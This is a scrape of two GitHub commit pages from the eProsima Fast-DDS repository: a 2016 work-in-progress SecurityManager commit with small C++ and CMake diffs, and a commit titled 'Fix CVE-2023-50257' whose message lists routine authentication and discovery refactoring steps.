  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2Fe1869863c06db7fbb366ae53760fbe6e754be026)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=eProsima%2FFast-DDS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eProsima](/eProsima)
/
**[Fast-DDS](/eProsima/Fast-DDS)**
Public

* [Notifications](/login?return_to=%2FeProsima%2FFast-DDS) You must be signed in to change notification settings
* [Fork
  787](/login?return_to=%2FeProsima%2FFast-DDS)
* [Star
   2.3k](/login?return_to=%2FeProsima%2FFast-DDS)

* [Code](/eProsima/Fast-DDS)
* [Issues
  48](/eProsima/Fast-DDS/issues)
* [Pull requests
  78](/eProsima/Fast-DDS/pulls)
* [Discussions](/eProsima/Fast-DDS/discussions)
* [Actions](/eProsima/Fast-DDS/actions)
* [Projects
  0](/eProsima/Fast-DDS/projects)
* [Security](/eProsima/Fast-DDS/security)
* [Insights](/eProsima/Fast-DDS/pulse)

Additional navigation options

* [Code](/eProsima/Fast-DDS)
* [Issues](/eProsima/Fast-DDS/issues)
* [Pull requests](/eProsima/Fast-DDS/pulls)
* [Discussions](/eProsima/Fast-DDS/discussions)
* [Actions](/eProsima/Fast-DDS/actions)
* [Projects](/eProsima/Fast-DDS/projects)
* [Security](/eProsima/Fast-DDS/security)
* [Insights](/eProsima/Fast-DDS/pulse)

## Commit

[Permalink](/eProsima/Fast-DDS/commit/e1869863c06db7fbb366ae53760fbe6e754be026)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Refs [#1811](https://github.com/eProsima/Fast-DDS/pull/1811). WIP SecurityManager.

[Browse files](/eProsima/Fast-DDS/tree/e1869863c06db7fbb366ae53760fbe6e754be026)
Browse the repository at this point in the history

* Loading branch information

[![@richiprosima](https://avatars.githubusercontent.com/u/7736122?s=40&v=4)](/richiprosima)

[richiprosima](/eProsima/Fast-DDS/commits?author=richiprosima "View all commits by richiprosima")
committed
Nov 8, 2016

1 parent
[43a186f](/eProsima/Fast-DDS/commit/43a186f136a04f6f37457a85d4fc5d32afe75513)

commit e186986

 Show file tree

 Hide file tree

Showing
**23 changed files**
with
**1,454 additions**
and
**18 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* include/fastrtps/rtps

  + security/authentication

    - include/fastrtps/rtps/security/authentication/Authentication.h
      [Authentication.h](#diff-85806b10c4fcfdbe9cd619f92d1ef3cc259c74ce2bfa0e7f5f8a950f1e0c5217)
  + writer

    - include/fastrtps/rtps/writer/ReaderProxy.h
      [ReaderProxy.h](#diff-f2c37809b4e57e88f4e41cf414acaefc2fd39b00c418ab79c919cdc002e04006)
* src/cpp

  + src/cpp/CMakeLists.txt
    [CMakeLists.txt](#diff-e3052ec6d01ba5f9ae8d014fd3bdd8653f7e759e704a77bbfdb99ada532923da)
  + rtps

    - participant

      * src/cpp/rtps/participant/RTPSParticipantImpl.cpp
        [RTPSParticipantImpl.cpp](#diff-4b0d41d014c0be56b2c276101b14f6931b2cd4969e420c159ce84053ed716020)
      * src/cpp/rtps/participant/RTPSParticipantImpl.h
        [RTPSParticipantImpl.h](#diff-ec7370e269b52364e225080029fff31e9e9e19ba92288b827abbe4e688182253)
    - security

      * src/cpp/rtps/security/SecurityManager.cpp
        [SecurityManager.cpp](#diff-196ca7d94f1ae6a62cc591590a6742796c6201afbdbfe84ebedd40d225e12888)
      * src/cpp/rtps/security/SecurityManager.h
        [SecurityManager.h](#diff-d0e76b0709b7fdbad6b50985d69084bbaab457688e79fe98e2df5805a0da2787)
  + security/authentication

    - src/cpp/security/authentication/PKIDH.cpp
      [PKIDH.cpp](#diff-b8725b82c39548c31026b866d01f3cb18b618f89ff151ae3f701fa04891e040d)
    - src/cpp/security/authentication/PKIDH.h
      [PKIDH.h](#diff-02414a85c02c4f7c1423f74edb5d9117a7eda8fdab615237ca9bf4b985cef54a)
* test

  + test/CMakeLists.txt
    [CMakeLists.txt](#diff-33394812ba204689144fd2f80832db83853ba1cb32403edb4e15fe4893e675fd)
  + mock/rtps

    - RTPSParticipantImpl/rtps/participant

      * test/mock/rtps/RTPSParticipantImpl/rtps/participant/RTPSParticipantImpl.h
        [RTPSParticipantImpl.h](#diff-398cbffc6fc59baa2b62a7825b0162442ea7839177864a734b3da7722f88da3c)
    - RTPSReader/fastrtps/rtps/reader

      * test/mock/rtps/RTPSReader/fastrtps/rtps/reader/RTPSReader.h
        [RTPSReader.h](#diff-b91214ad08dd0cb44ff17b2e23873264e55d768fa0e4edfaec67e27436c75336)
    - RTPSWriter/fastrtps/rtps/writer

      * test/mock/rtps/RTPSWriter/fastrtps/rtps/writer/RTPSWriter.h
        [RTPSWriter.h](#diff-a96e250e5f8f769cf83b34568a49ccf3588ba30fa7938b619ad659b5d6d2120e)
    - ReaderHistory/fastrtps/rtps/history

      * test/mock/rtps/ReaderHistory/fastrtps/rtps/history/ReaderHistory.h
        [ReaderHistory.h](#diff-cf31267752a7c01824a69c195677dd006476c191942f4fc77fbe169f0a0fc9b4)
    - SecurityPluginFactory

      * test/mock/rtps/SecurityPluginFactory/MockAuthenticationPlugin.h
        [MockAuthenticationPlugin.h](#diff-77de67f97060a50ca72faff74ff29585bf8129b24018203b9e1dd2ff382a7c65)
      * test/mock/rtps/SecurityPluginFactory/SecurityPluginFactory.cpp
        [SecurityPluginFactory.cpp](#diff-f459940d1fdeea46995639c40998f5426456e8d5f83f9597e7b0776ffdead801)
      * test/mock/rtps/SecurityPluginFactory/SecurityPluginFactory.h
        [SecurityPluginFactory.h](#diff-62c309dd3fde30910d22e143d65403db2f775dd037f7b16dff407c5cc92f155a)
    - StatelessReader/fastrtps/rtps/reader

      * test/mock/rtps/StatelessReader/fastrtps/rtps/reader/StatelessReader.h
        [StatelessReader.h](#diff-0b86fb77b58191f6dde2d5d7cfbbc5585b40cb66f88d6ae3adb2b021963a8907)
    - StatelessWriter/fastrtps/rtps/writer

      * test/mock/rtps/StatelessWriter/fastrtps/rtps/writer/StatelessWriter.h
        [StatelessWriter.h](#diff-1a3451316d7d9f93334ca804335a73ff26905c041b765274bde193025fffe5b3)
    - WriterHistory/fastrtps/rtps/history

      * test/mock/rtps/WriterHistory/fastrtps/rtps/history/WriterHistory.h
        [WriterHistory.h](#diff-10cc03d5c9aeec714b862e901fdda02a6c678fda63c94faaebe7104ce8487f3a)
  + unittest

    - rtps/security

      * test/unittest/rtps/security/CMakeLists.txt
        [CMakeLists.txt](#diff-513982f2e51cc8322e699ffb384607b106c6dcc9efc0d938e08c3572b8f38081)
      * test/unittest/rtps/security/SecurityAuthenticationTests.cpp
        [SecurityAuthenticationTests.cpp](#diff-211b479db613ab983bece6a1cf4295d618cb685101f79c1c1ca23715d35defef)
    - security/authentication

      * test/unittest/security/authentication/BuiltinPKIDHTests.cpp
        [BuiltinPKIDHTests.cpp](#diff-4833544bead7fa14b8f39dfbe568ba36541fdbeaf38681ed6bf1b5a9f723e0d7)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[include/fastrtps/rtps/security/authentication/Authentication.h](#diff-85806b10c4fcfdbe9cd619f92d1ef3cc259c74ce2bfa0e7f5f8a950f1e0c5217 "include/fastrtps/rtps/security/authentication/Authentication.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/e1869863c06db7fbb366ae53760fbe6e754be026/include/fastrtps/rtps/security/authentication/Authentication.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -94,7 +94,7 @@ class Authentication |
|  |  | virtual ValidationResult\_t validate\_remote\_identity(IdentityHandle\*\* remote\_identity\_handle, |
|  |  | const IdentityHandle& local\_identity\_handle, |
|  |  | IdentityToken&& remote\_identity\_token, |
|  |  | const GUID\_t remote\_participant\_key, |
|  |  | const GUID\_t& remote\_participant\_key, |
|  |  | SecurityException& exception) = 0; |
|  |  |  |
|  |  | /\*! |
| Expand Down | |  |

1 change: 0 additions & 1 deletion

1
[include/fastrtps/rtps/writer/ReaderProxy.h](#diff-f2c37809b4e57e88f4e41cf414acaefc2fd39b00c418ab79c919cdc002e04006 "include/fastrtps/rtps/writer/ReaderProxy.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/e1869863c06db7fbb366ae53760fbe6e754be026/include/fastrtps/rtps/writer/ReaderProxy.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -28,7 +28,6 @@ |
|  |  | #include "../attributes/WriterAttributes.h" |
|  |  |  |
|  |  | #include <set> |
|  |  | #include <unordered\_map> |
|  |  |  |
|  |  | namespace boost |
|  |  | { |
| Expand Down | |  |

3 changes: 3 additions & 0 deletions

3
[src/cpp/CMakeLists.txt](#diff-e3052ec6d01ba5f9ae8d014fd3bdd8653f7e759e704a77bbfdb99ada532923da "src/cpp/CMakeLists.txt")

Show comments

[View file](/eProsima/Fast-DDS/blob/e1869863c06db7fbb366ae53760fbe6e754be026/src/cpp/CMakeLists.txt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -170,12 +170,14 @@ if(MSVC OR MSVC\_IDE) |
|  |  | # Define public headers |
|  |  | target\_include\_directories(${PROJECT\_NAME} PUBLIC |
|  |  | $<BUILD\_INTERFACE:${PROJECT\_SOURCE\_DIR}/include> $<BUILD\_INTERFACE:${PROJECT\_BINARY\_DIR}/include/${PROJECT\_NAME}> |
|  |  | $<BUILD\_INTERFACE:${PROJECT\_SOURCE\_DIR}/src/cpp> |
|  |  | $<INSTALL\_INTERFACE:include> |
|  |  | ) |
|  |  |  |
|  |  | # Define public headers for static library |
|  |  | target\_include\_directories(${PROJECT\_NAME}\_static PUBLIC |
|  |  | $<BUILD\_INTERFACE:${PROJECT\_SOURCE\_DIR}/include> $<BUILD\_INTERFACE:${PROJECT\_BINARY\_DIR}/include/${PROJECT\_NAME}> |
|  |  | $<BUILD\_INTERFACE:${PROJECT\_SOURCE\_DIR}/src/cpp> |
|  |  | $<INSTALL\_INTERFACE:include> |
|  |  | ) |
|  |  |  |
| Expand All | | @@ -201,6 +203,7 @@ else() |
|  |  | # Define public headers |
|  |  | target\_include\_directories(${PROJECT\_NAME} PUBLIC |
|  |  | $<BUILD\_INTERFACE:${PROJECT\_SOURCE\_DIR}/include> $<BUILD\_INTERFACE:${PROJECT\_BINARY\_DIR}/include/${PROJECT\_NAME}> |
|  |  | $<BUILD\_INTERFACE:${PROJECT\_SOURCE\_DIR}/src/cpp> |
|  |  | $<INSTALL\_INTERFACE:include> |
|  |  | ) |
|  |  |  |
| Expand Down | |  |

7 changes: 1 addition & 6 deletions

7
[src/cpp/rtps/participant/RTPSParticipantImpl.cpp](#diff-4b0d41d014c0be56b2c276101b14f6931b2cd4969e420c159ce84053ed716020 "src/cpp/rtps/participant/RTPSParticipantImpl.cpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/e1869863c06db7fbb366ae53760fbe6e754be026/src/cpp/rtps/participant/RTPSParticipantImpl.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -87,7 +87,7 @@ Locator\_t RTPSParticipantImpl::applyLocatorAdaptRule(Locator\_t loc) |
|  |  | RTPSParticipantImpl::RTPSParticipantImpl(const RTPSParticipantAttributes& PParam, |
|  |  | const GuidPrefix\_t& guidP, |
|  |  | RTPSParticipant\* par, |
|  |  | RTPSParticipantListener\* plisten): m\_att(PParam), m\_guid(guidP,c\_EntityId\_RTPSParticipant), |
|  |  | RTPSParticipantListener\* plisten): m\_att(PParam), m\_guid(guidP ,c\_EntityId\_RTPSParticipant), |
|  |  | mp\_event\_thr(nullptr), |
|  |  | mp\_builtinProtocols(nullptr), |
|  |  | mp\_ResourceSemaphore(new boost::interprocess::interprocess\_semaphore(0)), |
| Expand Down  Expand Up | | @@ -859,11 +859,6 @@ void RTPSParticipantImpl::assertRemoteRTPSParticipantLiveliness(const GuidPrefix |
|  |  | this->mp\_builtinProtocols->mp\_PDP->assertRemoteParticipantLiveliness(guidP); |
|  |  | } |
|  |  |  |
|  |  | const RTPSParticipantAttributes& RTPSParticipantImpl::getRTPSParticipantAttributes() const |
|  |  | { |
|  |  | return this->m\_att; |
|  |  | } |
|  |  |  |
|  |  | uint32\_t RTPSParticipantImpl::getMaxMessageSize() const |
|  |  | { |
|  |  | uint32\_t minMaxMessageSize = UINT32\_MAX; |
| Expand Down | |  |

13 changes: 9 additions & 4 deletions

13
[src/cpp/rtps/participant/RTPSParticipantImpl.h](#diff-ec7370e269b52364e225080029fff31e9e9e19ba92288b827abbe4e688182253 "src/cpp/rtps/participant/RTPSParticipantImpl.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/e1869863c06db7fbb366ae53760fbe6e754be026/src/cpp/rtps/participant/RTPSParticipantImpl.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -13,7 +13,7 @@ |
|  |  | // limitations under the License. |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @file RTPSParticipant.h |
|  |  | \* @file RTPSParticipantImpl.h |
|  |  | \*/ |
|  |  |  |
|  |  | #ifndef RTPSParticipantIMPL\_H\_ |
| Expand Down  Expand Up | | @@ -131,7 +131,9 @@ class RTPSParticipantImpl |
|  |  | \* Get associated GUID |
|  |  | \* @return Associated GUID |
|  |  | \*/ |
|  |  | inline const GUID\_t& getGuid() const {return m\_guid;}; |
|  |  | inline const GUID\_t& getGuid() const { return m\_guid; } |
|  |  |  |
|  |  | void setGuid(GUID\_t& guid) { m\_guid = guid; } |
|  |  |  |
|  |  | //! Announce RTPSParticipantState (force the sending of a DPD message.) |
|  |  | void announceRTPSParticipantState(); |
| Expand Down  Expand Up | | @@ -208,7 +210,7 @@ class RTPSParticipantImpl |
|  |  | //!Attributes of the RTPSParticipant |
|  |  | RTPSParticipantAttributes m\_att; |
|  |  | //!Guid of the RTPSParticipant. |
|  |  | const GUID\_t m\_guid; |
|  |  | GUID\_t m\_guid; |
|  |  | //! Sending resources. - DEPRECATED -Stays commented for reference purposes |
|  |  | // ResourceSend\* mp\_send\_thr; |
|  |  | //! Event Resource |
| Expand Down  Expand Up | | @@ -304,7 +306,10 @@ class RTPSParticipantImpl |
|  |  |  |
|  |  | public: |
|  |  |  |
|  |  | const RTPSParticipantAttributes& getRTPSParticipantAttributes() const; |
|  |  | const RTPSParticipantAttributes& getRTPSParticipantAttributes() const |
|  |  | { |
|  |  | return this->m\_att; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Create a Writer in this RTPSParticipant. |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e186986`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2Fe1869863c06db7fbb366ae53760fbe6e754be026) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_b8480b5a_20250110_231637.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2Ff2e5ceae8fbea0a6c9445a366faaca0b98a8ef86)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2Ff2e5ceae8fbea0a6c9445a366faaca0b98a8ef86)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=eProsima%2FFast-DDS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eProsima](/eProsima)
/
**[Fast-DDS](/eProsima/Fast-DDS)**
Public

* [Notifications](/login?return_to=%2FeProsima%2FFast-DDS) You must be signed in to change notification settings
* [Fork
  787](/login?return_to=%2FeProsima%2FFast-DDS)
* [Star
   2.3k](/login?return_to=%2FeProsima%2FFast-DDS)

* [Code](/eProsima/Fast-DDS)
* [Issues
  48](/eProsima/Fast-DDS/issues)
* [Pull requests
  78](/eProsima/Fast-DDS/pulls)
* [Discussions](/eProsima/Fast-DDS/discussions)
* [Actions](/eProsima/Fast-DDS/actions)
* [Projects
  0](/eProsima/Fast-DDS/projects)
* [Security](/eProsima/Fast-DDS/security)
* [Insights](/eProsima/Fast-DDS/pulse)

Additional navigation options

* [Code](/eProsima/Fast-DDS)
* [Issues](/eProsima/Fast-DDS/issues)
* [Pull requests](/eProsima/Fast-DDS/pulls)
* [Discussions](/eProsima/Fast-DDS/discussions)
* [Actions](/eProsima/Fast-DDS/actions)
* [Projects](/eProsima/Fast-DDS/projects)
* [Security](/eProsima/Fast-DDS/security)
* [Insights](/eProsima/Fast-DDS/pulse)

## Commit

[Permalink](/eProsima/Fast-DDS/commit/f2e5ceae8fbea0a6c9445a366faaca0b98a8ef86)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix CVE-2023-50257

[Browse files](/eProsima/Fast-DDS/tree/f2e5ceae8fbea0a6c9445a366faaca0b98a8ef86)
Browse the repository at this point in the history

```
Signed-off-by: Miguel Company <miguelcompany@eprosima.com>
Co-authored-by: Mario Dominguez <mariodominguez@eprosima.com>

commit f2bcd264798ebd0d45241e57f7d522c68920b26f
Author: Miguel Company <miguelcompany@eprosima.com>
Date:   Thu Dec 14 10:52:32 2023 +0100

    Refs #19770. Improve BuiltinAuthenticationPlugin_second_participant_creation_loop.

    Signed-off-by: Miguel Company <miguelcompany@eprosima.com>

commit 07380f840422f8ea2a6ae62ec901fe94687f3b3c
Author: Miguel Company <miguelcompany@eprosima.com>
Date:   Wed Dec 13 08:21:34 2023 +0100

    Refs #19770. Fix PDPTests.

    Signed-off-by: Miguel Company <miguelcompany@eprosima.com>

commit 4c2c21e5f2be63c1f4e0766cc8bc5a59a857b106
Author: Miguel Company <miguelcompany@eprosima.com>
Date:   Wed Dec 13 07:26:51 2023 +0100

    Refs #19770. Adding override keyword.

    Signed-off-by: Miguel Company <miguelcompany@eprosima.com>

commit d185a85b937a1fd64f86a40b9db2d0b994e39a7f
Author: Miguel Company <miguelcompany@eprosima.com>
Date:   Tue Dec 12 16:05:00 2023 +0100

    Refs #19770. Uncrustify.

    Signed-off-by: Miguel Company <miguelcompany@eprosima.com>

commit 54a01ab0eff0e326c868d1a32bd44203bf184b4d
Author: Miguel Company <miguelcompany@eprosima.com>
Date:   Tue Dec 12 10:29:42 2023 +0100

    Refs #19770. PDPSecurityInitiatorListener relies on PDPListener::onNewCacheChangeAdded.

    Signed-off-by: Miguel Company <miguelcompany@eprosima.com>

commit 202bc52a4584025c897e06a40f50d5d7d6be8ce6
Author: Miguel Company <miguelcompany@eprosima.com>
Date:   Tue Dec 12 09:49:20 2023 +0100

    Refs #19770. Only process removals when reader is matched.

    Signed-off-by: Miguel Company <miguelcompany@eprosima.com>

commit a4a30779c0ae3b410b8cce4aa56f47490995d20d
Author: Miguel Company <miguelcompany@eprosima.com>
Date:   Tue Dec 12 09:46:03 2023 +0100

    Refs #19770. Added PDPSecurityInitiatorListener::process_alive_data.

    Signed-off-by: Miguel Company <miguelcompany@eprosima.com>

commit 3c7547e0b125ab7156aaf3f72b1a431a9d77672f
Author: Miguel Company <miguelcompany@eprosima.com>
Date:   Tue Dec 12 09:32:55 2023 +0100

    Refs #19770. Refactor with PDPListener::process_alive_data.

    Signed-off-by: Miguel Company <miguelcompany@eprosima.com>

commit 4571178679af32902a5ba6719807b75eabafc296
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Wed Nov 15 12:28:14 2023 +0100

    Refs #19770. StatelessReader does not call update_last_notified for not matched writers.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 8294ca3b0bae320f066779dfa1d9a8690b16ebfc
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Wed Nov 29 13:30:14 2023 +0100

    Refs #19770. Avoid dynamic_cast when participant is not secure.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 83820e84c6cc3dcaf53e6ffe784ed03b2fac9bfa
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Wed Nov 29 13:24:59 2023 +0100

    Refs #19770. Avoid warning when built without security.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 8ce1216f6af4758f4cb8dc1ea63c770a5ff86e1a
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Wed Nov 29 12:55:28 2023 +0100

    Refs #19770. Fixed typo in comments.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 7bb64eb4a0b899b8055beb8a8b0b279db80e20d6
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Wed Nov 29 12:52:07 2023 +0100

    Refs #19770. Use constexpr for topic names.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit eef95273d5464210c50a01cb22cc4a3989233f2f
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Wed Nov 29 12:50:56 2023 +0100

    Refs #19770. Send participant dispose messages through both writers.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit c3c831f5f047c4a02a3ddd9944ce3015644f3e27
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Tue Nov 28 10:07:17 2023 +0100

    Refs #19770. Move to `AUTHENTICATION_FAILED` when authentication fails.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 11f98a4d0132d630b76c68ed4157a8624dcffaa5
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Tue Nov 28 10:05:47 2023 +0100

    Refs #19770. Simulate DATA(p) reception on non secure `notifyAboveRemoteEndpoints`.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 5097288e5f4816e653a7c5a4c4839d2a077f3d19
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Wed Nov 22 09:36:14 2023 +0100

    Refs #19770. Common factor method `notify_and_maybe_ignore_new_participant`.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 9364310c5c3cf47b586470b90f9511b0be11fbc4
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Tue Nov 21 07:56:17 2023 +0100

    Refs #19770. Improve AllowUnauthenticatedParticipants blackbox tests.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit bb8af40be3c8c138e48acfced5835f2066d864dd
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Mon Nov 20 09:53:10 2023 +0100

    Refs #19770. Change builtin endpoints matching workflow.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit 4fc685f75949637ee07ede7a72dd43ed4ab351f3
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Fri Nov 17 12:34:40 2023 +0100

    Refs #19770. Chages in announceParticipantState.

    Signed-off-by: Miguel Company <MiguelCompany@eprosima.com>

commit fb26bbccf6400123d2cb0d89d34f8c907e301d1a
Author: Miguel Company <MiguelCompany@eprosima.com>
Date:   Fri Nov 17 12:23:48 2023 +0100

    Refs #19770. Chages in removeRemoteEndpoints.

